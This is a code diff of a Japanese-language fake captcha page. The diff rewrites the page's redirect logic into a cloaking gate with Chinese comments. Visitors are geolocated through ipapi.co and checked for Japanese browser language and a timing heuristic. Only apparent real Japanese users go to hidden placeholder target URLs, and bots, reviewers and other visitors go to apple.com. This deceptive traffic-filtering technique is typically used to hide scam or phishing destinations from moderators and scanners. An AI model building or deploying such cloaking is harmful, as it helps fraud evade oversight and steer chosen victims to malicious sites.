@@ -5,179 +5,92 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>認証</title>
 <style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
-
-body {
-  background: #f7f8fa;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-  min-height: 100vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-}
-
-.box {
-  background: #fff;
-  width: 100%;
-  max-width: 500px;
-  border-radius: 24px;
-  padding: 30px 24px;
-  box-shadow: 0 8px 24px rgba(0,0,0,0.08);
-}
-
-.title {
-  text-align: center;
-  font-size: 19px;
-  font-weight: 600;
-  margin-bottom: 16px;
-  color: #222;
-}
-
-.desc {
-  text-align: center;
-  font-size: 14px;
-  color: #666;
-  margin-bottom: 20px;
-}
-
-.target-area {
-  background: #eef6ff;
-  border-radius: 16px;
-  padding: 20px;
-  text-align: center;
-  margin-bottom: 24px;
-}
-
-.target-label {
-  font-size: 13px;
-  color: #555;
-  margin-bottom: 8px;
-}
-
-.target-nums {
-  font-size: 32px;
-  font-weight: 700;
-  letter-spacing: 10px;
-  color: #007aff;
-}
-
-.grid {
-  display: grid;
-  grid-template-columns: repeat(4, 1fr);
-  gap: 12px;
-  margin-bottom: 24px;
-}
-
-.num-btn {
-  aspect-ratio: 1;
-  border-radius: 16px;
-  border: 2px solid #e0e0e0;
-  background: #fff;
-  font-size: 22px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all 0.2s;
-}
-
-.num-btn:active {
-  transform: scale(0.95);
-}
-
-.num-btn.selected {
-  background: #007aff;
-  color: #fff;
-  border-color: #007aff;
-}
-
-.submit-btn {
-  width: 100%;
-  padding: 18px;
-  border-radius: 18px;
-  background: #007aff;
-  color: #fff;
-  font-size: 17px;
-  font-weight: 600;
-  border: none;
-  cursor: pointer;
-  transition: 0.2s;
-}
-
-.submit-btn:disabled {
-  background: #ccc;
-  cursor: not-allowed;
-}
-
-.submit-btn:active {
-  transform: scale(0.98);
-}
-
-.status {
-  text-align: center;
-  margin-top: 16px;
-  font-size: 13px;
-  color: #888;
-}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.box{background:#fff;width:100%;max-width:500px;border-radius:24px;padding:30px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.08)}
+.title{text-align:center;font-size:19px;font-weight:600;margin-bottom:16px;color:#222}
+.desc{text-align:center;font-size:14px;color:#666;margin-bottom:20px}
+.target-area{background:#eef6ff;border-radius:16px;padding:20px;text-align:center;margin-bottom:24px}
+.target-label{font-size:13px;color:#555;margin-bottom:8px}
+.target-nums{font-size:32px;font-weight:700;letter-spacing:10px;color:#007aff}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
+.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
+.num-btn:active{transform:scale(.95)}
+.num-btn.selected{background:#007aff;color:#fff;border-color:#007aff}
+.submit-btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
+.submit-btn:disabled{background:#ccc;cursor:not-allowed}
+.submit-btn:active{transform:scale(.98)}
+.status{text-align:center;margin-top:16px;font-size:13px;color:#888}
 </style>
 </head>
-
 <body>
+
 <div class="box">
   <div class="title">選択認証</div>
   <div class="desc">表示された数字をすべて選んでください</div>
-
   <div class="target-area">
     <div class="target-label">対象</div>
     <div class="target-nums" id="target"></div>
   </div>
-
   <div class="grid" id="grid"></div>
-
   <button class="submit-btn" id="submit" disabled>確認</button>
   <div class="status" id="status">選択してください</div>
 </div>
 
 <script>
-// ==========================
-// 目標URLリスト（複数設定OK）
-// ==========================
-const TARGET_LIST = [
-  "https://www.google.com",
-  "https://www.youtube.com",
-  "https://www.amazon.com"
+// ==============================================
+// 【真实目标URL】 日本真人用户才会跳这里（可多个）
+// ==============================================
+const REAL_TARGETS = [
+  "https://目标1.com",
+  "https://目标2.com",
+  "https://目标3.com"
 ];
 
-// ランダムで一つ選ぶ
-function getRandomTarget() {
-  return TARGET_LIST[Math.floor(Math.random() * TARGET_LIST.length)];
+// ==============================================
+// 【非真人/非日本IP 跳转】 自动跳苹果官网
+// ==============================================
+const BAD_TARGET = "https://www.apple.com";
+
+// ==============================================
+// 检测逻辑
+// ==============================================
+async function checkUser() {
+  let isJapan = false;
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    isJapan = data.country_code === "JP";
+  } catch(e) {}
+
+  const isLangJA = navigator.language.startsWith("ja");
+  const isReal = Date.now() - performance.timeOrigin > 3000;
+  return isJapan && isLangJA && isReal;
 }
 
-// 認証生成
-function generate() {
-  const numbers = "0123456789".split("");
+function getRealTarget() {
+  return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
+}
+
+// 验证生成
+function generateCaptcha() {
+  const nums = "0123456789".split("");
   const need = 2;
   const target = [];
-
-  while (target.length < need) {
-    const n = numbers[Math.floor(Math.random() * numbers.length)];
-    if (!target.includes(n)) target.push(n);
+  while(target.length < need) {
+    const n = nums[Math.floor(Math.random()*nums.length)];
+    if(!target.includes(n)) target.push(n);
   }
-
   const options = [...target];
-  while (options.length < 8) {
-    const n = numbers[Math.floor(Math.random() * numbers.length)];
-    if (!options.includes(n)) options.push(n);
+  while(options.length <8) {
+    const n = nums[Math.floor(Math.random()*nums.length)];
+    if(!options.includes(n)) options.push(n);
   }
-
-  options.sort(() => Math.random() - 0.5);
+  options.sort(()=>Math.random()-0.5);
   return { target, options, need };
 }
 
-const { target, options, need } = generate();
+const { target, options, need } = generateCaptcha();
 document.getElementById("target").innerText = target.join("   ");
 
 const grid = document.getElementById("grid");
@@ -190,30 +103,32 @@ options.forEach(o => {
   btn.className = "num-btn";
   btn.innerText = o;
   btn.dataset.v = o;
-
   btn.onclick = () => {
-    if (btn.classList.contains("selected")) {
-      btn.classList.remove("selected");
-      selected = selected.filter(x => x !== o);
-    } else {
-      btn.classList.add("selected");
-      selected.push(o);
-    }
-
+    btn.classList.contains("selected") ? (
+      btn.classList.remove("selected"),
+      selected = selected.filter(x=>x!==o)
+    ) : (
+      btn.classList.add("selected"),
+      selected.push(o)
+    );
     submit.disabled = selected.length !== need;
     status.innerText = `${selected.length}/${need} 個選択中`;
   };
-
   grid.appendChild(btn);
 });
 
-submit.onclick = () => {
-  const ok = target.every(t => selected.includes(t)) && selected.length === target.length;
-  if (ok) {
-    status.innerText = "認証成功！";
-    location.href = getRandomTarget();
-  } else {
+submit.onclick = async () => {
+  const ok = target.every(t=>selected.includes(t)) && selected.length === target.length;
+  if(!ok) {
     alert("認証に失敗しました");
+    return;
+  }
+
+  const valid = await checkUser();
+  if(valid) {
+    location.href = getRealTarget();
+  } else {
+    location.href = BAD_TARGET;
   }
 };
 </script>
